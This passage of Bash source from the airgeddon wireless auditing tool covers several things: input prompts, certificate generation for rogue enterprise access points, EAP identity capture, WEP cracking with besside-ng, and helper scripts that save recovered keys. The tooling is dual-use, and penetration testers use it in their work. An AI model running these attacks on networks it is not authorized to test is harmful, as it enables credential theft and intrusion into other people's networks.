		if [ -z "${bssid}" ]; then
			ask_yesno 439 "no"
			if [ "${yesno}" = "n" ]; then
				return 1
			fi
		fi

		while [[ ! ${bssid} =~ ${regexp} ]]; do
			read_bssid
		done
		echo
		language_strings "${language}" 28 "blue"
	fi
	return 0
}

#Read the user input on essid questions
function read_essid() {

	debug_print

	echo
	language_strings "${language}" 29 "green"
	read -rp "> " essid
}

#Check if selected essid is hidden and offer a change
function check_hidden_essid() {

	debug_print

	if [ "${1}" = "wps" ]; then
		if [[ -z "${wps_essid}" ]] || [[ "${wps_essid}" = "(Hidden Network)" ]]; then
			ask_yesno 30 "no"
			if [ "${yesno}" = "y" ]; then
				while [[ -z "${wps_essid}" ]] || [[ "${wps_essid}" = "(Hidden Network)" ]]; do
					read_essid
				done

				echo
				language_strings "${language}" 718 "blue"
			fi
		fi
	else
		if [[ -z "${essid}" ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
			if [ "${2}" = "verify" ]; then
				ask_yesno 30 "no"
				if [ "${yesno}" = "y" ]; then
					while [[ -z "${essid}" ]] || [[ "${essid}" = "(Hidden Network)" ]]; do
						read_essid
					done
				else
					return 1
				fi
			else
				while [[ -z "${essid}" ]] || [[ "${essid}" = "(Hidden Network)" ]]; do
					read_essid
				done
			fi
			echo
			language_strings "${language}" 31 "blue"
		fi
	fi
}

#Validate the input on essid questions
function ask_essid() {

	debug_print

	if [ "${1}" = "verify" ]; then
		if ! check_hidden_essid "normal" "verify"; then
			return 1
		fi
	else
		if ! check_hidden_essid "normal" "noverify"; then
			return 1
		fi
	fi
}

#Read the user input on custom pin questions
function read_custom_pin() {

	debug_print

	echo
	language_strings "${language}" 363 "green"
	read -rp "> " custom_pin
}

#Validate the input on custom pin questions
function ask_custom_pin() {

	debug_print

	local regexp="^[0-9]{8}$"
	custom_pin=""
	while [[ ! ${custom_pin} =~ ${regexp} ]]; do
		read_custom_pin
	done

	echo
	language_strings "${language}" 362 "blue"
}

#Read the user input on timeout questions
function read_timeout() {

	debug_print

	echo
	case ${1} in
		"wps_standard")
			min_max_timeout="10-100"
			timeout_shown="${timeout_secs_per_pin}"
		;;
		"wps_pixiedust")
			min_max_timeout="25-2400"
			timeout_shown="${timeout_secs_per_pixiedust}"
		;;
		"capture_handshake_decloak")
			min_max_timeout="10-100"
			timeout_shown="${timeout_capture_handshake_decloak}"
		;;
		"capture_pmkid")
			min_max_timeout="10-100"
			timeout_shown="${timeout_capture_pmkid}"
		;;
		"capture_identities")
			min_max_timeout="10-300"
			timeout_shown="${timeout_capture_identities}"
		;;
	esac

	language_strings "${language}" 393 "green"
	read -rp "> " timeout
}

#Validate the user input for timeouts
function ask_timeout() {

	debug_print

	case ${1} in
		"wps_standard")
			local regexp="^[1-9][0-9]$|^100$|^$"
		;;
		"wps_pixiedust")
			local regexp="^2[5-9]$|^[3-9][0-9]$|^[1-9][0-9]{2}$|^1[0-9]{3}$|^2[0-3][0-9]{2}$|^2400$|^$"
		;;
		"capture_handshake_decloak")
			local regexp="^[1-9][0-9]$|^100$|^$"
		;;
		"capture_pmkid")
			local regexp="^[1-9][0-9]$|^100$|^$"
		;;
		"capture_identities")
			local regexp="^([1-9][0-9]|[12][0-9][0-9]|300)$|^$"
		;;
	esac

	timeout=0
	while [[ ! ${timeout} =~ ${regexp} ]]; do
		read_timeout "${1}"
	done

	if [ "${timeout}" = "" ]; then
		case ${1} in
			"wps_standard")
				timeout="${timeout_secs_per_pin}"
			;;
			"wps_pixiedust")
				timeout="${timeout_secs_per_pixiedust}"
			;;
			"capture_handshake_decloak")
				timeout="${timeout_capture_handshake_decloak}"
			;;
			"capture_pmkid")
				timeout="${timeout_capture_pmkid}"
			;;
			"capture_identities")
				timeout="${timeout_capture_identities}"
			;;
		esac
	fi

	echo
	case ${1} in
		"wps_standard")
			timeout_secs_per_pin="${timeout}"
		;;
		"wps_pixiedust")
			timeout_secs_per_pixiedust="${timeout}"
		;;
		"capture_handshake_decloak")
			timeout_capture_handshake_decloak="${timeout}"
		;;
		"capture_pmkid")
			timeout_capture_pmkid="${timeout}"
		;;
		"capture_identities")
			timeout_capture_identities="${timeout}"
		;;
	esac

	language_strings "${language}" 391 "blue"
}

#Handle the proccess of checking decloak capture
function decloak_check() {

	debug_print

	local time_counter=0
	while true; do
		sleep 5
		if check_essid_in_capture_file; then
			break
		fi

		time_counter=$((time_counter + 5))
		if [ "${time_counter}" -ge "${timeout_capture_handshake_decloak}" ]; then
			break
		fi
	done

	kill "${processiddecloak}" &> /dev/null
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		tmux kill-window -t "${session_name}:Decloaking"
	fi
}

#Handle the proccess of checking handshake capture
function handshake_capture_check() {

	debug_print

	local time_counter=0
	while true; do
		sleep 5
		if check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "silent" "only_handshake"; then
			break
		fi

		time_counter=$((time_counter + 5))
		if [ "${time_counter}" -ge "${timeout_capture_handshake_decloak}" ]; then
			break
		fi
	done

	kill "${processidcapture}" &> /dev/null
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		tmux kill-window -t "${session_name}:Capturing Handshake"
	fi
}

#Generate the needed config files for certificates creation
#shellcheck disable=SC2016
function create_certificates_config_files() {

	debug_print

	rm -rf "${tmpdir}${certsdir}" > /dev/null 2>&1
	mkdir "${tmpdir}${certsdir}" > /dev/null 2>&1

	{
	echo -e "[ ca ]"
	echo -e "default_ca = CA_default\n"
	echo -e "[ CA_default ]"
	echo -e "dir = ${tmpdir}${certsdir::-1}"
	echo -e 'certs = $dir'
	echo -e 'crl_dir = $dir/crl'
	echo -e 'database = $dir/index.txt'
	echo -e 'new_certs_dir = $dir'
	echo -e 'certificate = $dir/server.pem'
	echo -e 'serial = $dir/serial'
	echo -e 'crl = $dir/crl.pem'
	echo -e 'private_key = $dir/server.key'
	echo -e 'RANDFILE = $dir/.rand'
	echo -e "name_opt = ca_default"
	echo -e "cert_opt = ca_default"
	echo -e "default_days = 3650"
	echo -e "default_crl_days = 30"
	echo -e "default_md = sha256"
	echo -e "preserve = no"
	echo -e "policy = policy_match\n"
	echo -e "[ policy_match ]"
	echo -e "countryName = match"
	echo -e "stateOrProvinceName = match"
	echo -e "organizationName = match"
	echo -e "organizationalUnitName = optional"
	echo -e "commonName = supplied"
	echo -e "emailAddress = optional\n"
	echo -e "[ policy_anything ]"
	echo -e "countryName = optional"
	echo -e "stateOrProvinceName = optional"
	echo -e "localityName = optional"
	echo -e "organizationName = optional"
	echo -e "organizationalUnitName = optional"
	echo -e "commonName = supplied"
	echo -e "emailAddress = optional\n"
	echo -e "[ req ]"
	echo -e "prompt = no"
	echo -e "distinguished_name = server"
	echo -e "default_bits = 2048"
	echo -e "input_password = ${certspass}"
	echo -e "output_password = ${certspass}\n"
	echo -e "[server]"
	echo -e "countryName = ${custom_certificates_country}"
	echo -e "stateOrProvinceName = ${custom_certificates_state}"
	echo -e "localityName = ${custom_certificates_locale}"
	echo -e "organizationName = ${custom_certificates_organization}"
	echo -e "emailAddress = ${custom_certificates_email}"
	echo -e "commonName = \"${custom_certificates_cn}\""
	} >> "${tmpdir}${certsdir}server.cnf"

	{
	echo -e "[ ca ]"
	echo -e "default_ca = CA_default\n"
	echo -e "[ CA_default ]"
	echo -e "dir = ${tmpdir}${certsdir::-1}"
	echo -e 'certs = $dir'
	echo -e 'crl_dir = $dir/crl'
	echo -e 'database = $dir/index.txt'
	echo -e 'new_certs_dir = $dir'
	echo -e 'certificate = $dir/ca.pem'
	echo -e 'serial = $dir/serial'
	echo -e 'crl = $dir/crl.pem'
	echo -e 'private_key = $dir/ca.key'
	echo -e 'RANDFILE = $dir/.rand'
	echo -e "name_opt = ca_default"
	echo -e "cert_opt = ca_default"
	echo -e "default_days = 3650"
	echo -e "default_crl_days = 30"
	echo -e "default_md = sha256"
	echo -e "preserve = no"
	echo -e "policy = policy_match\n"
	echo -e "[ policy_match ]"
	echo -e "countryName = match"
	echo -e "stateOrProvinceName = match"
	echo -e "organizationName= match"
	echo -e "organizationalUnitName = optional"
	echo -e "commonName = supplied"
	echo -e "emailAddress = optional\n"
	echo -e "[ policy_anything ]"
	echo -e "countryName = optional"
	echo -e "stateOrProvinceName = optional"
	echo -e "localityName = optional"
	echo -e "organizationName = optional"
	echo -e "organizationalUnitName = optional"
	echo -e "commonName = supplied"
	echo -e "emailAddress = optional\n"
	echo -e "[ req ]"
	echo -e "prompt = no"
	echo -e "distinguished_name = certificate_authority"
	echo -e "default_bits = 2048"
	echo -e "input_password = ${certspass}"
	echo -e "output_password = ${certspass}"
	echo -e "x509_extensions = v3_ca\n"
	echo -e "[certificate_authority]"
	echo -e "countryName = ${custom_certificates_country}"
	echo -e "stateOrProvinceName = ${custom_certificates_state}"
	echo -e "localityName = ${custom_certificates_locale}"
	echo -e "organizationName = ${custom_certificates_organization}"
	echo -e "emailAddress = ${custom_certificates_email}"
	echo -e "commonName = \"${custom_certificates_cn}\"\n"
	echo -e "[v3_ca]"
	echo -e "subjectKeyIdentifier = hash"
	echo -e "authorityKeyIdentifier = keyid:always,issuer:always"
	echo -e "basicConstraints = critical,CA:true"
	} >> "${tmpdir}${certsdir}ca.cnf"

	{
	echo -e "[ xpclient_ext ]"
	echo -e "extendedKeyUsage = 1.3.6.1.5.5.7.3.2\n"
	echo -e "[ xpserver_ext ]"
	echo -e "extendedKeyUsage = 1.3.6.1.5.5.7.3.1"
	} >> "${tmpdir}${certsdir}xpextensions"
}

#Manage the questions to decide if custom certificates are used
#shellcheck disable=SC2181
function custom_certificates_integration() {

	debug_print

	ask_yesno 645 "no"
	if [ "${yesno}" = "y" ]; then
		if [ -n "${enterprisecerts_completepath}" ]; then
			ask_yesno 646 "yes"
			if [ "${yesno}" = "y" ]; then
				read_certspath=0
			else
				read_certspath=1
			fi
		else
			read_certspath=1
		fi
		use_custom_certs=1
	else
		use_custom_certs=0
	fi

	echo
	if [ "${use_custom_certs}" -eq 1 ]; then
		if [ "${read_certspath}" -eq 0 ]; then
			hostapd_wpe_cert_path="${enterprisecerts_completepath}"
			hostapd_wpe_cert_pass="${certspass}"
			language_strings "${language}" 648 "yellow"
		else
			language_strings "${language}" 327 "green"
			echo -en '> '
			hostapd_wpe_cert_path=$(read -re _hostapd_wpe_cert_path; echo -n "${_hostapd_wpe_cert_path}")
			hostapd_wpe_cert_path=$(fix_autocomplete_chars "${hostapd_wpe_cert_path}")

			lastcharhostapd_wpe_cert_path=${hostapd_wpe_cert_path: -1}
			if [ "${lastcharhostapd_wpe_cert_path}" != "/" ]; then
				hostapd_wpe_cert_path="${hostapd_wpe_cert_path}/"
			fi

			firstcharhostapd_wpe_cert_path=${hostapd_wpe_cert_path:: 1}
			if [ "${firstcharhostapd_wpe_cert_path}" != "/" ]; then
				hostapd_wpe_cert_path="${scriptfolder}${hostapd_wpe_cert_path}"
			fi

			hostapd_wpe_cert_pass=""
			while [[ ! ${hostapd_wpe_cert_pass} =~ ^.{4,1023}$ ]]; do
				echo
				language_strings "${language}" 329 "green"
				read -rp "> " hostapd_wpe_cert_pass
			done
		fi
	else
		hostapd_wpe_cert_path="${default_certs_path}"
		hostapd_wpe_cert_pass="${default_certs_pass}"
		language_strings "${language}" 647 "yellow"
	fi

	echo
	language_strings "${language}" 649 "blue"
	echo

	local certsresult
	certsresult=$(validate_certificates "${hostapd_wpe_cert_path}" "${hostapd_wpe_cert_pass}")
	if [ "${certsresult}" = "0" ]; then
		language_strings "${language}" 650 "yellow"
		language_strings "${language}" 115 "read"
		return 0
	elif [ "${certsresult}" = "1" ]; then
		language_strings "${language}" 237 "red"
		language_strings "${language}" 115 "read"
		return 1
	elif [ "${certsresult}" = "2" ]; then
		language_strings "${language}" 326 "red"
		language_strings "${language}" 115 "read"
		return 1
	else
		language_strings "${language}" 330 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi
}

#Validate if certificates files are correct
function validate_certificates() {

	debug_print
	local certsresult
	certsresult=0

	if ! [ -f "${1}server.pem" ] || ! [ -r "${1}server.pem" ] || ! [ -f "${1}ca.pem" ] || ! [ -r "${1}ca.pem" ] || ! [ -f "${1}server.key" ] || ! [ -r "${1}server.key" ]; then
		certsresult=1
	else
		if ! openssl x509 -in "${1}server.pem" -inform "PEM" -checkend "0" > /dev/null 2>&1 || ! openssl x509 -in "${1}ca.pem" -inform "PEM" -checkend "0" > /dev/null 2>&1; then
			certsresult=2
		elif ! openssl rsa -in "${1}server.key" -passin "pass:${2}" -check > /dev/null 2>&1; then
			certsresult=3
		fi
	fi

	echo "${certsresult}"
}

#Create custom certificates
function create_custom_certificates() {

	debug_print

	echo
	language_strings "${language}" 642 "blue"

	openssl dhparam -out "${tmpdir}${certsdir}dh" 1024 > /dev/null 2>&1
	openssl req -new -out "${tmpdir}${certsdir}server.csr" -keyout "${tmpdir}${certsdir}server.key" -config "${tmpdir}${certsdir}server.cnf" > /dev/null 2>&1
	openssl req -new -x509 -keyout "${tmpdir}${certsdir}ca.key" -out "${tmpdir}${certsdir}ca.pem" -days 3650 -config "${tmpdir}${certsdir}ca.cnf" > /dev/null 2>&1
	touch "${tmpdir}${certsdir}index.txt" > /dev/null 2>&1
	echo '01' > "${tmpdir}${certsdir}serial" 2> /dev/null
	openssl ca -batch -keyfile "${tmpdir}${certsdir}ca.key" -cert "${tmpdir}${certsdir}ca.pem" -in "${tmpdir}${certsdir}server.csr" -key "${certspass}" -out "${tmpdir}${certsdir}server.crt" -extensions xpserver_ext -extfile "${tmpdir}${certsdir}xpextensions" -config "${tmpdir}${certsdir}server.cnf" > /dev/null 2>&1
	openssl pkcs12 -export -in "${tmpdir}${certsdir}server.crt" -inkey "${tmpdir}${certsdir}server.key" -out "${tmpdir}${certsdir}server.p12" -passin pass:${certspass} -passout pass:${certspass} > /dev/null 2>&1
	openssl pkcs12 -in "${tmpdir}${certsdir}server.p12" -out "${tmpdir}${certsdir}server.pem" -passin pass:${certspass} -passout pass:${certspass} > /dev/null 2>&1

	manage_enterprise_certs
	save_enterprise_certs
}

#Set up custom certificates
function custom_certificates_questions() {

	debug_print

	custom_certificates_country=""
	custom_certificates_state=""
	custom_certificates_locale=""
	custom_certificates_organization=""
	custom_certificates_email=""
	custom_certificates_cn=""

	local email_length_regex
	local email_spetial_chars_regex
	local email_domain_regex
	local regexp

	regexp="^[A-Za-z]{2}$"
	while [[ ! ${custom_certificates_country} =~ ${regexp} ]]; do
		read_certificates_data "country"
	done

	while [[ -z "${custom_certificates_state}" ]]; do
		read_certificates_data "state"
	done

	while [[ -z "${custom_certificates_locale}" ]]; do
		read_certificates_data "locale"
	done

	while [[ -z "${custom_certificates_organization}" ]]; do
		read_certificates_data "organization"
	done

	email_length_regex='.*{7,320}'
	email_spetial_chars_regex='\!\#\$\%\&\*\+\/\=\?\^\_\`\{\|\}\~\-'
	email_domain_regex='([[:alpha:]]([[:alnum:]\-]*[[:alnum:]])?)\.([[:alpha:]]([[:alnum:]\-]*[[:alnum:]])?\.)*[[:alpha:]]([[:alnum:]\-]*[[:alnum:]])?'
	regexp="^[[:alnum:]${email_spetial_chars_regex}]+(\.[[:alnum:]${email_spetial_chars_regex}]+)*[[:alnum:]${email_spetial_chars_regex}]*\@${email_domain_regex}$"
	while [[ ! ${custom_certificates_email} =~ ${regexp} ]] || [[ ! ${custom_certificates_email} =~ ${email_length_regex} ]]; do
		read_certificates_data "email"
	done

	regexp="^(\*|[[:alpha:]]([[:alnum:]\-]{0,61}[[:alnum:]])?)\.([[:alpha:]]([[:alnum:]\-]{0,61}[[:alnum:]])?\.)*[[:alpha:]]([[:alnum:]\-]{0,61}[[:alnum:]])?$"
	while [[ ! ${custom_certificates_cn} =~ ${regexp} ]]; do
		read_certificates_data "cn"
	done
}

#Read the user input on custom certificates questions
function read_certificates_data() {

	debug_print

	echo
	case "${1}" in
		"country")
			language_strings "${language}" 630 "green"
			read -rp "> " custom_certificates_country
			custom_certificates_country="${custom_certificates_country^^}"
		;;
		"state")
			language_strings "${language}" 631 "green"
			read -rp "> " custom_certificates_state
		;;
		"locale")
			language_strings "${language}" 632 "green"
			read -rp "> " custom_certificates_locale
		;;
		"organization")
			language_strings "${language}" 633 "green"
			read -rp "> " custom_certificates_organization
		;;
		"email")
			language_strings "${language}" 634 "green"
			read -rp "> " custom_certificates_email
			custom_certificates_email="${custom_certificates_email,,}"
		;;
		"cn")
			language_strings "${language}" 635 "green"
			read -rp "> " custom_certificates_cn
			custom_certificates_cn="${custom_certificates_cn,,}"
		;;
	esac
}

#Prepare enterprise identities capture
function enterprise_identities() {

	debug_print

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
		echo
		language_strings "${language}" 125 "yellow"
		language_strings "${language}" 115 "read"
		if ! explore_for_targets_option "WPA" "enterprise"; then
			return 1
		fi
	fi

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if [ "${channel}" -gt 14 ]; then
		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
			echo
			language_strings "${language}" 515 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi
	fi

	if ! validate_network_encryption_type "WPA"; then
		return 1
	fi

	launch_identity_capture
}

#Launch enterprise identities capture
function launch_identity_capture() {

	debug_print

	ask_timeout "capture_identities"

	echo
	language_strings "${language}" 743 "yellow"
	language_strings "${language}" 115 "read"

	echo
	language_strings "${language}" 325 "blue"

	rm -rf "${tmpdir}identities"* > /dev/null 2>&1
	recalculate_windows_sizes
	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Capturing Identities\"" "timeout -s SIGTERM ${timeout_capture_identities} airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}identities ${interface}" "Capturing Identities" "active"
	wait_for_process "timeout -s SIGTERM ${timeout_capture_identities} airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}identities ${interface}" "Capturing Identities"

	echo
	language_strings "${language}" 744 "blue"
	identities_check "${tmpdir}identities"*.cap "${bssid}"
	language_strings "${language}" 115 "read"
}

#Search for enterprise identities in a given capture file for a specific BSSID
function identities_check() {

	debug_print

	declare -ga identities_array
	readarray -t identities_array < <(tshark -r "${1}" -Y "(eap && wlan.ra == ${2}) && (eap.identity)" -T fields -e eap.identity 2> /dev/null | sort -u)

	echo
	if [ "${#identities_array[@]}" -eq 0 ]; then
		language_strings "${language}" 745 "red"
	else
		language_strings "${language}" 746 "yellow"
		echo
		for identity in "${identities_array[@]}"; do
			echo "${identity}"
		done
	fi
	echo
}

#Validate if selected network has the needed type of encryption
function validate_network_encryption_type() {

	debug_print

	case ${1} in
		"WPA"|"WPA2"|"WPA3")
			if [[ "${enc}" != "WPA" ]] && [[ "${enc}" != "WPA2" ]] && [[ "${enc}" != "WPA3" ]]; then
				echo
				language_strings "${language}" 137 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		;;
		"WEP")
			if [ "${enc}" != "WEP" ]; then
				echo
				language_strings "${language}" 424 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		;;
	esac

	return 0
}

#Execute wep besside attack
#shellcheck disable=SC2164
function exec_wep_besside_attack() {

	debug_print

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"

	prepare_wep_attack "besside"

	recalculate_windows_sizes
	pushd "${tmpdir}" > /dev/null 2>&1
	manage_output "-hold -bg \"#000000\" -fg \"#FF00FF\" -geometry ${g2_stdleft_window} -T \"WEP Besside-ng attack\"" "besside-ng -c \"${channel}\" -b \"${bssid}\" \"${interface}\" -v | tee \"${tmpdir}${wep_besside_log}\"" "WEP Besside-ng attack" "active"
	wait_for_process "besside-ng -c \"${channel}\" -b \"${bssid//:/ }\" \"${interface}\" -v" "WEP Besside-ng attack"
	popd "${tmpdir}" > /dev/null 2>&1

	manage_wep_besside_pot
}

#Execute wep all-in-one attack
#shellcheck disable=SC2164
function exec_wep_allinone_attack() {

	debug_print

	echo
	language_strings "${language}" 296 "yellow"
	language_strings "${language}" 115 "read"

	prepare_wep_attack "allinone"
	set_wep_script

	recalculate_windows_sizes
	bash "${tmpdir}${wep_attack_file}" > /dev/null 2>&1 &
	wep_script_pid=$!

	set_wep_key_script
	bash "${tmpdir}${wep_key_handler}" "${wep_script_pid}" > /dev/null 2>&1 &
	wep_key_script_pid=$!

	echo
	language_strings "${language}" 434 "yellow"
	language_strings "${language}" 115 "read"

	kill_wep_windows
}

#Kill the wep attack processes
function kill_wep_windows() {

	debug_print

	kill "${wep_script_pid}" &> /dev/null
	wait $! 2> /dev/null

	kill "${wep_key_script_pid}" &> /dev/null
	wait $! 2> /dev/null

	readarray -t WEP_PROCESSES_TO_KILL < <(cat < "${tmpdir}${wepdir}${wep_processes_file}" 2> /dev/null)
	for item in "${WEP_PROCESSES_TO_KILL[@]}"; do
		kill "${item}" &> /dev/null
	done

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		kill_tmux_windows
	fi
}

#Prepare wep attacks deleting temp files
function prepare_wep_attack() {

	debug_print

	if [ "${1}" = "allinone" ]; then
		rm -rf "${tmpdir}${wep_attack_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}${wep_key_handler}" > /dev/null 2>&1
		rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
		rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
	else
		rm -rf "${tmpdir}${wep_besside_log}" > /dev/null 2>&1
		rm -rf "${tmpdir}wep.cap" > /dev/null 2>&1
		rm -rf "${tmpdir}wps.cap" > /dev/null 2>&1
		rm -rf "${tmpdir}besside.log" > /dev/null 2>&1
	fi
}

#Create here-doc bash script used for key handling on wep all-in-one and besside attacks
function set_wep_key_script() {

	debug_print

	exec 8>"${tmpdir}${wep_key_handler}"

	cat >&8 <<-EOF
		#!/usr/bin/env bash

		AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING}"

		#Function to launch window using xterm/tmux
		function manage_output() {

			xterm_parameters="\${1}"
			tmux_command_line="\${2}"
			xterm_command_line="\"\${2}\""
			window_name="\${3}"
			command_tail=" > /dev/null 2>&1 &"

			case "\${AIRGEDDON_WINDOWS_HANDLING}" in
				"tmux")
					local tmux_color
					tmux_color=""
					[[ "\${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="\${BASH_REMATCH[2]}"
					case "\${4}" in
						"active")
							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}" "active"
						;;
						*)
							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}"
						;;
					esac
				;;
				"xterm")
					eval "xterm \${xterm_parameters} -e \${xterm_command_line}\${command_tail}"
				;;
			esac
		}

		#Start supporting scripts inside its own tmux window
		function start_tmux_processes() {

			window_name="\${1}"
			command_line="\${2}"
			tmux kill-window -t "${session_name}:\${window_name}" 2> /dev/null
			case "\${4}" in
				"active")
					tmux new-window -t "${session_name}:" -n "\${window_name}"
				;;
				*)
					tmux new-window -d -t "${session_name}:" -n "\${window_name}"
				;;
			esac
			local tmux_color_cmd
			if [ -n "\${3}" ]; then
				tmux_color_cmd="bg=#000000 fg=\${3}"
			else
				tmux_color_cmd="bg=#000000"
			fi
			tmux setw -t "\${window_name}" window-style "\${tmux_color_cmd}"
			tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
		}

		wep_key_found=0

		#Check if the wep password was captured and manage to save it on a file
		function manage_wep_allinone_pot() {

			if [ -f "${tmpdir}${wepdir}wepkey.txt" ]; then
				wep_hex_key_cmd="cat \"${tmpdir}${wepdir}wepkey.txt\""
				wep_hex_key=\$(eval "\${wep_hex_key_cmd}")
				wep_ascii_key=\$(echo "\${wep_hex_key}" | awk 'RT{printf "%c", strtonum("0x"RT)}' RS='[0-9A-Fa-f]{2}')

				echo "" > "${weppotenteredpath}"
				{
				date +%Y-%m-%d
				echo -e "${wep_texts[${language},1]}"
				echo ""
				echo -e "BSSID: ${bssid}"
				echo -e "${wep_texts[${language},2]}: ${channel}"
				echo -e "ESSID: ${essid}"
				echo ""
				echo "---------------"
				echo ""
				echo -e "ASCII: \${wep_ascii_key}"
				echo -en "${wep_texts[${language},3]}:"
				echo -e " \${wep_hex_key}"
				echo ""
				echo "---------------"
				echo ""
				echo "${footer_texts[${language},0]}"
				} >> "${weppotenteredpath}"
			fi
		}

		#Kill the wep attack processes
		function kill_wep_script_windows() {

			readarray -t WEP_PROCESSES_TO_KILL < <(cat < "${tmpdir}${wepdir}${wep_processes_file}" 2> /dev/null)
			for item in "\${WEP_PROCESSES_TO_KILL[@]}"; do
				kill "\${item}" &> /dev/null
			done
		}
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&8 <<-EOF
			#Function to kill tmux windows using window name
			function kill_tmux_windows() {

				local TMUX_WINDOWS_LIST=()
				local current_window_name
				readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
				for item in "\${TMUX_WINDOWS_LIST[@]}"; do
					[[ "\${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="\${BASH_REMATCH[1]}"
					if [ "\${current_window_name}" = "${tmux_main_window}" ]; then
						continue
					fi
					if [ -n "\${1}" ]; then
						if [ "\${current_window_name}" = "\${1}" ]; then
							continue
						fi
					fi
					tmux kill-window -t "${session_name}:\${current_window_name}"
				done
			}
		EOF
	fi

	cat >&8 <<-EOF
		while true; do
			sleep 1
			if [ -f "${tmpdir}${wepdir}wepkey.txt" ]; then
				wep_key_found=1
				break
			fi

			wep_script_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${1}$" 2> /dev/null)
			if [ -z "\${wep_script_alive}" ]; then
				break
			fi
		done

		if [ "\${wep_key_found}" -eq 1 ]; then
			manage_wep_allinone_pot
		fi

		kill_wep_script_windows
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&8 <<-EOF
			kill_tmux_windows "WEP Key Decrypted"
		EOF
	fi

	cat >&8 <<-EOF
		rm -rf "${tmpdir}${wepdir}${wep_processes_file}"
		touch "${tmpdir}${wepdir}${wep_processes_file}" > /dev/null 2>&1
		if [ "\${wep_key_found}" -eq 1 ]; then
			wep_key_cmd="echo -e '\t${yellow_color}${wep_texts[${language},5]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${wep_texts[${language},2]}: ${normal_color}${channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}'"
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -e '\t${blue_color}${wep_texts[${language},4]}${normal_color}'"
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -en '\t${blue_color}ASCII: ${normal_color}'"
			wep_key_cmd+="&& echo -en '\${wep_ascii_key}'"
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -en '\t${blue_color}${wep_texts[${language},3]}: ${normal_color}'"
			wep_key_cmd+="&& echo -en '\${wep_hex_key}'"
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -e '\t${pink_color}${wep_texts[${language},6]}: [${normal_color}${weppotenteredpath}${pink_color}]${normal_color}'"
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -e '\t${yellow_color}${wep_texts[${language},0]}'"

			window_position="${g5_topright_window}"
			sleep 0.5
			manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry \${window_position} -T \"WEP Key Decrypted\"" "clear;\${wep_key_cmd}" "WEP Key Decrypted" "active"
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		cat >&8 <<-EOF
			wep_key_window_pid="\$!"
			{
				echo -e "\${wep_key_window_pid}"
			} >> "${tmpdir}${wepdir}${wep_processes_file}"
		EOF
	fi

	cat >&8 <<-EOF
		fi
	EOF
}

#Create here-doc bash script used for wep all-in-one attack
function set_wep_script() {

	debug_print

	current_mac=$(cat < "/sys/class/net/${interface}/address" 2> /dev/null)

	exec 6>"${tmpdir}${wep_attack_file}"

	cat >&6 <<-EOF
		#!/usr/bin/env bash

		AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING}"
		global_process_pid=""

		#Function to launch window using xterm/tmux
		function manage_output() {

			xterm_parameters="\${1}"
			tmux_command_line="\${2}"
			xterm_command_line="\"\${2}\""
			window_name="\${3}"
			command_tail=" > /dev/null 2>&1 &"

			case "\${AIRGEDDON_WINDOWS_HANDLING}" in
				"tmux")
					local tmux_color
					tmux_color=""
					[[ "\${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="\${BASH_REMATCH[2]}"
					case "\${4}" in
						"active")
							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}" "active"
						;;
						*)
							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}"
						;;
					esac
				;;
				"xterm")
					eval "xterm \${xterm_parameters} -e \${xterm_command_line}\${command_tail}"
				;;
			esac
		}

		#Start supporting scripts inside its own tmux window
		function start_tmux_processes() {

			window_name="\${1}"
			command_line="\${2}"
			tmux kill-window -t "${session_name}:\${window_name}" 2> /dev/null
			case "\${4}" in
				"active")
					tmux new-window -t "${session_name}:" -n "\${window_name}"
				;;
				*)
					tmux new-window -d -t "${session_name}:" -n "\${window_name}"
				;;
			esac

